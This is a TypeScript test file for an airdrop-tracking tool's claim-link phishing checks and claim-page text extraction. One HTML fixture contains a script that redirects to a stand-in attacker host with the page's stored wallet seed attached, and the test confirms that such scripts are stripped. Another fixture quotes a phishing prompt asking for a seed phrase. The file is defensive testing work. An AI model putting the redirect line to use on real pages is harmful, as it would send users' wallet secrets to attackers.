// Claim link checks in `score` and claim portal pages in `analyze` (curation spec §15.2, #42, #56).
import { describe, expect, it } from "vitest";
import { emptyStats } from "../src/stats.js";
import { MemoryRepo } from "../src/store/memory-repo.js";
import type { ProjectForScoring } from "../src/store/repo.js";
import { checkClaimLinks, claimPageText, readClaimPages, saveLinkChecks } from "../src/steps/link-checks.js";

const NOW = new Date("2026-10-11T03:00:00Z");
const DAY = 86_400_000;
const daysAgo = (n: number) => new Date(NOW.getTime() - n * DAY);

function scored(id: string, links: { url: string; kind: string }[], officialDomains: string[] = []): ProjectForScoring {
  return {
    id,
    slug: id,
    name: id,
    nameKey: id,
    tokenSymbol: null,
    chains: [],
    officialDomains,
    status: "live",
    conflict: false,
    lookalikeOf: null,
    firstSeen: NOW,
    lastSeen: NOW,
    tasks: [],
    steps: [],
    facts: [],
    deadlines: [],
    links,
    sourceCount: 1,
    documentCount: 1,
    sourceKinds: ["airdrops_io"],
    lookalikeOfName: null,
    lookalikeOfDomains: [],
    sourceAsks: [],
    signals: [],
  };
}

describe("checkClaimLinks", () => {
  it("checks every claim and app link once per project, from the per-domain GoPlus results", () => {
    const arcus = scored(
      "arcus",
      [
        { url: "https://arcus.xyz/", kind: "website" },
        { url: "https://claim.arcus.xyz/", kind: "claim" },
        { url: "https://app.arcus.xyz/swap", kind: "app" },
        { url: "https://arcus-claim.io/claim", kind: "claim" },
        { url: "https://arcus-claim.io/claim", kind: "claim" },
        { url: "https://docs.arcus.xyz/", kind: "docs" },
        { url: "https://x.com/arcus", kind: "social" },
      ],
      ["arcus.xyz"],
    );
    const phishing = new Map<string, boolean | null>([
      ["arcus.xyz", false],
      ["arcus-claim.io", true],
    ]);

    const result = checkClaimLinks([arcus], phishing);

    expect(result.byProject.get("arcus")).toEqual([
      { url: "https://claim.arcus.xyz/", status: "official" },
      { url: "https://app.arcus.xyz/swap", status: "official" },
      { url: "https://arcus-claim.io/claim", status: "phishing" },
    ]);
    expect([...result.byUrl]).toEqual([
      ["https://claim.arcus.xyz/", "official"],
      ["https://app.arcus.xyz/swap", "official"],
      ["https://arcus-claim.io/claim", "phishing"],
    ]);
  });

  it("calls a link unchecked when GoPlus skipped or failed its domain", () => {
    const p = scored(
      "p",
      [
        { url: "https://claim.p.xyz/", kind: "claim" },
        { url: "https://p-claim.io/", kind: "claim" },
        { url: "https://never-asked.io/", kind: "app" },
      ],
      ["p.xyz"],
    );
    const result = checkClaimLinks([p], new Map([["p.xyz", null], ["p-claim.io", null]]));
    expect(result.byProject.get("p")?.map((l) => l.status)).toEqual(["unchecked", "unchecked", "unchecked"]);
  });

  it("stores the more cautious status for a link that is official for one project but not for another", () => {
    const real = scored("real", [{ url: "https://claim.arcus.xyz/", kind: "claim" }], ["arcus.xyz"]);
    const copycat = scored("copycat", [{ url: "https://claim.arcus.xyz/", kind: "claim" }], ["arcus-fake.io"]);
    const phishing = new Map([["arcus.xyz", false]]);

    for (const order of [[real, copycat], [copycat, real]]) {
      const result = checkClaimLinks(order, phishing);
      expect(result.byProject.get("real")).toEqual([{ url: "https://claim.arcus.xyz/", status: "official" }]);
      expect(result.byProject.get("copycat")).toEqual([{ url: "https://claim.arcus.xyz/", status: "different_domain" }]);
      expect([...result.byUrl]).toEqual([["https://claim.arcus.xyz/", "different_domain"]]);
    }
  });

  it("gives a project without claim or app links no entry", () => {
    const result = checkClaimLinks([scored("w", [{ url: "https://w.xyz/", kind: "website" }], ["w.xyz"])], new Map());
    expect(result.byProject.get("w")).toEqual([]);
    expect(result.byUrl.size).toBe(0);
  });
});

describe("saveLinkChecks", () => {
  it("writes one link_checks row per URL and counts the checks and the phishing ones", async () => {
    const repo = new MemoryRepo();
    const stats = emptyStats();
    const byUrl = new Map([
      ["https://claim.arcus.xyz/", "official" as const],
      ["https://arcus-claim.io/", "phishing" as const],
      ["https://other-claim.io/", "phishing" as const],
      ["https://unknown.io/", "unchecked" as const],
    ]);

    await saveLinkChecks(repo, byUrl, NOW, stats);

    expect(await repo.listLinkChecks([...byUrl.keys()])).toEqual([
      { url: "https://arcus-claim.io/", status: "phishing", checkedAt: NOW },
      { url: "https://claim.arcus.xyz/", status: "official", checkedAt: NOW },
      { url: "https://other-claim.io/", status: "phishing", checkedAt: NOW },
      { url: "https://unknown.io/", status: "unchecked", checkedAt: NOW },
    ]);
    expect(stats).toMatchObject({ link_checks_total: 4, link_checks_phishing: 2 });
  });
});

describe("claimPageText", () => {
  it("keeps the readable text of the page and drops scripts, styles and other non-text parts", () => {
    const html = `<html><head><title>Arcus Claim</title><style>body{color:red}</style>
      <script>window.location='https://evil.io/?seed='+localStorage.seed</script></head>
      <body><h1>Claim your ARC</h1><p>Connect your wallet   to check eligibility.</p>
      <noscript>Enable JavaScript</noscript><template><p>hidden template</p></template>
      <iframe src="https://evil.io/frame"></iframe><svg><text>svg text</text></svg>
      <ul><li>Step one</li><li>Step two</li></ul></body></html>`;

    // normalizeText keeps at most one blank line between blocks.
    expect(claimPageText(html)).toBe(
      "Arcus Claim\n\nClaim your ARC\n\nConnect your wallet to check eligibility.\n\nStep one\n\nStep two",
    );
  });

  it("caps the text at 20,000 characters", () => {
    expect(claimPageText(`<p>${"a".repeat(30_000)}</p>`)).toHaveLength(20_000);
  });

  it("gives an empty text for a page whose content only scripts would render", () => {
    expect(claimPageText('<html><body><div id="root"></div><script src="/app.js"></script></body></html>')).toBe("");
  });
});

describe("readClaimPages", () => {
  /** A fake untrusted fetch: `pages` by URL (others 404); records every requested URL. */
  function fakeFetch(pages: Record<string, string>) {
    const requested: string[] = [];
    const fetchUntrusted = async (url: string) => {
      requested.push(url);
      const body = pages[url];
      return body === undefined ? { status: 404, body: "" } : { status: 200, body };
    };
    return { fetchUntrusted, requested };
  }

  it("fetches each claim and app link once and gives its text to every project that links it", async () => {
    const repo = new MemoryRepo();
    const stats = emptyStats();
    const a = scored("a", [
      { url: "https://claim.shared.io/", kind: "claim" },
      { url: "https://a.xyz/", kind: "website" },
      { url: "https://app.a.xyz/x", kind: "app" },
    ]);
    const b = scored("b", [{ url: "https://claim.shared.io/", kind: "claim" }]);
    const { fetchUntrusted, requested } = fakeFetch({
      "https://claim.shared.io/": "<p>Claim now, only 2 hours left</p>",
      "https://app.a.xyz/x": "<p>Swap</p>",
      "https://a.xyz/": "<p>Home</p>",
    });

    const pages = await readClaimPages({ repo, fetchUntrusted }, [a, b], NOW, stats);

    expect(requested.sort()).toEqual(["https://app.a.xyz/x", "https://claim.shared.io/"]);
    expect(pages.get("a")).toEqual([
      { url: "https://claim.shared.io/", text: "Claim now, only 2 hours left" },
      { url: "https://app.a.xyz/x", text: "Swap" },
    ]);
    expect(pages.get("b")).toEqual([{ url: "https://claim.shared.io/", text: "Claim now, only 2 hours left" }]);
    expect(stats.claim_pages_read).toBe(2);
    expect(await repo.listClaimPages(["https://claim.shared.io/"])).toEqual([
      { url: "https://claim.shared.io/", text: "Claim now, only 2 hours left", fetchedAt: NOW },
    ]);
  });

  it("never fetches or reads a link whose latest check is phishing, and fetches never-checked ones", async () => {
    const repo = new MemoryRepo();
    await repo.saveLinkCheck("https://evil-claim.io/", "phishing", daysAgo(1));
    await repo.saveLinkCheck("https://other-claim.io/", "different_domain", daysAgo(1));
    // Cached before the link was listed as phishing.
    await repo.saveClaimPage("https://evil-claim.io/", "Enter your seed phrase", daysAgo(1));
    const p = scored("p", [
      { url: "https://evil-claim.io/", kind: "claim" },
      { url: "https://other-claim.io/", kind: "claim" },
      { url: "https://new-claim.io/", kind: "claim" },
    ]);
    const { fetchUntrusted, requested } = fakeFetch({
      "https://evil-claim.io/": "<p>Enter your seed phrase</p>",
      "https://other-claim.io/": "<p>Other</p>",
      "https://new-claim.io/": "<p>New</p>",
    });

    const pages = await readClaimPages({ repo, fetchUntrusted }, [p], NOW, emptyStats());

    expect(requested.sort()).toEqual(["https://new-claim.io/", "https://other-claim.io/"]);
    expect(pages.get("p")?.map((s) => s.url)).toEqual(["https://other-claim.io/", "https://new-claim.io/"]);
  });

  it("reuses a page fetched in the last 7 days and fetches an older one again", async () => {
    const repo = new MemoryRepo();
    await repo.saveClaimPage("https://fresh.io/", "Fresh text", daysAgo(7));
    await repo.saveClaimPage("https://old.io/", "Old text", new Date(daysAgo(7).getTime() - 1));
    const p = scored("p", [
      { url: "https://fresh.io/", kind: "claim" },
      { url: "https://old.io/", kind: "claim" },
    ]);
    const stats = emptyStats();
    const { fetchUntrusted, requested } = fakeFetch({ "https://fresh.io/": "<p>Changed</p>", "https://old.io/": "<p>New text</p>" });

    const pages = await readClaimPages({ repo, fetchUntrusted }, [p], NOW, stats);

    expect(requested).toEqual(["https://old.io/"]);
    expect(pages.get("p")).toEqual([
      { url: "https://fresh.io/", text: "Fresh text" },
      { url: "https://old.io/", text: "New text" },
    ]);
    expect(stats.claim_pages_read).toBe(1);
  });

  it("fetches at most 20 pages per run, never-fetched pages first and claim links before app links", async () => {
    const repo = new MemoryRepo();
    const links: { url: string; kind: string }[] = [];
    // 5 cached pages 8-12 days old, 12 never-fetched app links, 10 never-fetched claim links.
    for (let i = 0; i < 5; i++) {
      await repo.saveClaimPage(`https://stale${i}.io/`, `stale ${i}`, daysAgo(8 + i));
      links.push({ url: `https://stale${i}.io/`, kind: "claim" });
    }
    for (let i = 0; i < 12; i++) links.push({ url: `https://app${i}.io/x`, kind: "app" });
    for (let i = 0; i < 10; i++) links.push({ url: `https://claim${i}.io/`, kind: "claim" });
    const pages = Object.fromEntries(links.map((l) => [l.url, `<p>${l.url} text</p>`]));
    const { fetchUntrusted, requested } = fakeFetch(pages);
    const stats = emptyStats();

    const read = await readClaimPages({ repo, fetchUntrusted }, [scored("p", links)], NOW, stats);

    expect(requested.sort()).toEqual(
      [
        ...["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"].map((i) => `https://claim${i}.io/`),
        // The first 10 app links by url.
        ...["0", "1", "10", "11", "2", "3", "4", "5", "6", "7"].map((i) => `https://app${i}.io/x`),
      ].sort(),
    );
    expect(stats.claim_pages_read).toBe(20);
    // The 5 cached pages not fetched again this run are still read from the cache (at most 14 days old).
    expect(read.get("p")).toHaveLength(25);
  });

  it("refreshes the oldest cached pages first", async () => {
    const repo = new MemoryRepo();
    const links: { url: string; kind: string }[] = [];
    // 22 cached pages, 8 to 29 days old.
    for (let age = 8; age < 30; age++) {
      await repo.saveClaimPage(`https://age${age}.io/`, `age ${age}`, daysAgo(age));
      links.push({ url: `https://age${age}.io/`, kind: "claim" });
    }
    const { fetchUntrusted, requested } = fakeFetch(Object.fromEntries(links.map((l) => [l.url, "<p>new</p>"])));

    await readClaimPages({ repo, fetchUntrusted }, [scored("p", links)], NOW, emptyStats());

    expect(requested).toHaveLength(20);
    expect(requested).not.toContain("https://age8.io/");
    expect(requested).not.toContain("https://age9.io/");
  });

  it("keeps the last text of a page that fails to load for up to 14 days", async () => {
    const repo = new MemoryRepo();
    await repo.saveClaimPage("https://day14.io/", "Day 14 text", daysAgo(14));
    await repo.saveClaimPage("https://day15.io/", "Day 15 text", new Date(daysAgo(14).getTime() - 1));
    const p = scored("p", [
      { url: "https://day14.io/", kind: "claim" },
      { url: "https://day15.io/", kind: "claim" },
      { url: "https://never.io/", kind: "claim" },
    ]);
    const stats = emptyStats();
    const { fetchUntrusted, requested } = fakeFetch({});

    const pages = await readClaimPages({ repo, fetchUntrusted }, [p], NOW, stats);

    expect(requested.sort()).toEqual(["https://day14.io/", "https://day15.io/", "https://never.io/"]);
    expect(pages.get("p")).toEqual([{ url: "https://day14.io/", text: "Day 14 text" }]);
    expect(stats.claim_pages_read).toBe(0);
    // A failed fetch leaves the cache as it was.
    expect((await repo.listClaimPages(["https://day14.io/"]))[0]?.fetchedAt).toEqual(daysAgo(14));
  });

  it("caches a page without text so it is not fetched again within 7 days, and gives no document for it", async () => {
    const repo = new MemoryRepo();
    const p = scored("p", [{ url: "https://spa.io/claim", kind: "claim" }]);
    const first = fakeFetch({ "https://spa.io/claim": '<div id="root"></div><script src="/a.js"></script>' });

    expect((await readClaimPages({ repo, fetchUntrusted: first.fetchUntrusted }, [p], NOW, emptyStats())).get("p")).toEqual([]);

    const second = fakeFetch({});
    await readClaimPages({ repo, fetchUntrusted: second.fetchUntrusted }, [p], new Date(NOW.getTime() + DAY), emptyStats());
    expect(second.requested).toEqual([]);
  });
});
